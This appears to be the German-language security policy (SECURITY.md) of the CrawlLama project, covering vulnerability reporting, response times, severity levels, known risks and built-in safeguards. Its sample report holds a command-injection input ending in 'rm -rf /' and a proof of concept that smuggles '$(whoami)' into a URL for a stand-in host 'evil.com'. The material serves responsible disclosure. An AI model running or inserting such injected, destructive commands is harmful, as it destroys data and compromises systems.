# Security Policy

---

📚 **Navigation:** [README](README.md) | [Contributing](CONTRIBUTING.md) | [Docs](docs/README.md) | [Changelog](CHANGELOG.md)

---

## Sicherheitsrichtlinie

Die Sicherheit von CrawlLama ist uns wichtig. Wenn du eine Sicherheitslücke entdeckst, bitten wir dich, diese verantwortungsvoll zu melden.

## Unterstützte Versionen

Wir stellen Sicherheitsupdates für die folgenden Versionen bereit:

| Version | Unterstützt          |
| ------- | -------------------- |
| 1.3.x   | :white_check_mark:   |
| 1.2.x   | :white_check_mark:   |
| 1.1.x   | :x:                  |
| < 1.1   | :x:                  |

## Sicherheitslücken melden

### Bitte NICHT öffentlich melden

**Erstelle KEINE öffentlichen GitHub Issues für Sicherheitslücken.** Dies könnte andere Nutzer gefährden.

### Verantwortungsvolle Offenlegung

Bitte melde Sicherheitslücken verantwortungsvoll über:

#### GitHub Security Advisory

1. Gehe zu [Security Advisories](https://github.com/arn-c0de/Crawllama/security/advisories)
2. Klicke auf "Report a vulnerability"
3. Fülle das Formular mit Details aus

### Was sollte der Bericht enthalten?

Bitte gib so viele Details wie möglich an:

- **Art der Sicherheitslücke** (z.B. Code-Injection, XSS, Arbitrary File Read)
- **Betroffene Version(en)**
- **Schritte zur Reproduktion**
- **Proof of Concept (PoC)** Code oder Screenshot
- **Potenzielle Auswirkung** (z.B. RCE, Datenleck, DoS)
- **Vorgeschlagene Lösung** (optional)
- **CVE-ID** (falls bereits vorhanden)

**Beispiel:**

```markdown
**Sicherheitslücke:** Command Injection in page_reader.py

**Version:** v1.3.0

**Beschreibung:**
Die Funktion `fetch_page()` in `tools/page_reader.py` validiert 
User-Input nicht korrekt, was zu Command Injection führen kann.

**Schritte:**
1. Starte CrawlLama
2. Gebe folgende URL ein: `http://example.com; rm -rf /`
3. Command wird auf dem System ausgeführt

**Auswirkung:** 
Remote Code Execution (RCE) als User, der CrawlLama ausführt

**PoC:**
```python
from tools.page_reader import fetch_page
fetch_page("http://evil.com$(whoami)")
```

**Vorschlag:**
URL-Validierung mit `validators.url()` vor der Verarbeitung
```

### Response-Zeiten

Wir bemühen uns um folgende Response-Zeiten:

- **Erstantwort**: Innerhalb von 48 Stunden
- **Erste Bewertung**: Innerhalb von 7 Tagen
- **Fix für kritische Lücken**: Innerhalb von 30 Tagen
- **Fix für moderate Lücken**: Innerhalb von 90 Tagen

## Schweregrade

Wir verwenden das [CVSS v3.1](https://www.first.org/cvss/calculator/3.1) Scoring-System:

| Schweregrad | CVSS Score | Beispiele |
|-------------|------------|-----------|
| **Critical** | 9.0-10.0 | RCE, Authentication Bypass |
| **High** | 7.0-8.9 | SQL Injection, XSS |
| **Medium** | 4.0-6.9 | CSRF, Information Disclosure |
| **Low** | 0.1-3.9 | Minor Information Leaks |

## Bekannte Sicherheitsrisiken

### Lokaler Betrieb erforderlich

CrawlLama ist für **lokalen Betrieb** konzipiert. Bei öffentlicher Exposition (z.B. über FastAPI):

⚠️ **Wichtige Sicherheitsmaßnahmen:**

1. **Authentication**: Implementiere API-Key-Authentication
2. **Rate Limiting**: Nutze das eingebaute Rate-Limiting (`security.rate_limit`)
3. **Input Validation**: Alle User-Inputs werden validiert
4. **Firewall**: Exponiere API nur über Firewall/Reverse Proxy
5. **HTTPS**: Nutze TLS für verschlüsselte Kommunikation

### Web-Scraping Risiken

- **Malicious Content**: Webseiten können schädlichen Content enthalten
- **SSRF**: Server-Side Request Forgery durch User-kontrollierte URLs
- **DoS**: Unendliche Weiterleitungen oder große Downloads

**Mitigation:**
- Domain-Blacklist aktiviert (`data/blacklist.txt`)
- Timeout-Limits konfiguriert
- Max. Response-Size limitiert
- robots.txt wird respektiert

### LLM-spezifische Risiken

- **Prompt Injection**: Malicious Prompts in Suchergebnissen
- **Data Poisoning**: Falsche Informationen in RAG-Datenbank
- **Model Hallucination**: Generierte Fehlinformationen

**Mitigation:**
- Hallucination Detection aktiviert (`core/hallu_detect.py`)
- Output-Sanitization
- Source-Attribution (Quellenangabe)

### Dependency Vulnerabilities

Wir überwachen Dependencies regelmäßig:

```bash
# Prüfe Dependencies
pip-audit
safety check

# Oder mit unserem Script
python scripts/check_dependencies.py
```

**Automatische Updates:** Dependabot ist aktiviert und erstellt PRs für Security-Updates.

## Sicherheits-Features

CrawlLama hat folgende eingebaute Sicherheits-Features:

### 1. Input Validation

```python
# utils/validators.py
validate_url()        # URL-Format prüfen
validate_query()      # Query-Länge/Content prüfen
sanitize_output()     # LLM-Output bereinigen
```

### 2. Rate Limiting

```python
# config.json
"security": {
  "rate_limit": 1.0,  # Requests pro Sekunde
  "check_robots_txt": true
}
```

### 3. Domain Blacklist

```python
# data/blacklist.txt
# Blockiert bekannte malicious Domains
malware-site.com
phishing-domain.net
```

### 4. Secure Config

```python
# API-Keys werden verschlüsselt gespeichert
from utils.secure_config import SecureConfig
config = SecureConfig()
config.set_key("api_key", "secret")  # Verschlüsselt
```

### 5. Sandbox für Plugins

```python
# Plugins laufen in separatem Namespace
# Kein Zugriff auf sensible Daten
```

## Sicherheits-Best-Practices

### Für Benutzer

1. **Keine Secrets committen**: Nutze `.env` für API-Keys
2. **API nicht exponieren**: Nur lokaler Zugriff empfohlen
3. **Updates installieren**: Halte CrawlLama aktuell
4. **Vorsicht bei URLs**: Prüfe Quellen vor dem Hinzufügen
5. **Logs überwachen**: Prüfe `logs/app.log` regelmäßig

### Für Entwickler

1. **Input validieren**: Nutze `validators.py` für alle Inputs
2. **Output sanitizen**: Bereinige LLM-Outputs vor der Anzeige
3. **Secrets außerhalb des Codes**: Nie in Code, immer in `.env`
4. **Dependencies prüfen**: `pip-audit` vor jedem Release
5. **Tests schreiben**: Security-relevante Features testen

## Security-Checklist vor Release

- [ ] `pip-audit` ohne Critical/High Vulnerabilities
- [ ] Keine Secrets in Code/Config committed
- [ ] `.env.example` hat nur Platzhalter
- [ ] Domain-Blacklist aktualisiert
- [ ] Rate-Limiting aktiviert
- [ ] Input-Validation für alle User-Inputs
- [ ] Output-Sanitization für LLM-Responses
- [ ] Security-Tests laufen grün
- [ ] Dokumentation aktualisiert

## Disclosure Policy

Nach dem Fix einer Sicherheitslücke:

1. **Security Advisory** wird auf GitHub veröffentlicht
2. **CVE** wird beantragt (für High/Critical)
3. **Release Notes** erwähnen den Fix (ohne Details)
4. **Credits** für den Reporter (falls gewünscht)
5. **30-Tage-Wartezeit** vor Full Disclosure

## Hall of Fame

Wir danken folgenden Security-Researchern für verantwortungsvolle Offenlegung:

<!-- 
Beispiel-Format:
- **[Name]** - [Vulnerability Type] - [Month Year]
-->

*Noch keine Meldungen - sei der Erste!*

## Bug Bounty Program

Derzeit haben wir **kein offizielles Bug Bounty Program**. 

Wir würdigen jedoch alle Sicherheitsmeldungen mit:
- **Public Credits** (falls gewünscht)
- **Erwähnung in Release Notes**
- **Hall of Fame Eintrag**

## Kontakt

- **GitHub Security**: [Security Advisories](https://github.com/arn-c0de/Crawllama/security/advisories)

## Weitere Ressourcen

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [CVSS Calculator](https://www.first.org/cvss/calculator/3.1)
- [Responsible Disclosure Policy](https://en.wikipedia.org/wiki/Responsible_disclosure)

---

**Vielen Dank für deine Hilfe, CrawlLama sicher zu halten!** 🔒
